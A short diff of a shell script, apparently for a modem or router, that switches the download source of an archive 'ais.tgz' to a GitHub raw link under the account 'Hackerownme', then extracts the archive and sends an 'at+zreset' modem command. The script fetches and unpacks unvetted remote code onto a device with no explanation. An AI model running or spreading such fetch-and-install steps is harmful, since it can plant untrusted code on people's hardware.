@@ -1,5 +1,5 @@
 #!/bin/sh
-wget http://junjuncruzit.online/ais.tgz
+wget https://github.com/Hackerownme/bjc/raw/main/ais.tgz
 tar -zxvf ais.tgz
 rm ais.tgz
 at_cmd at+zreset
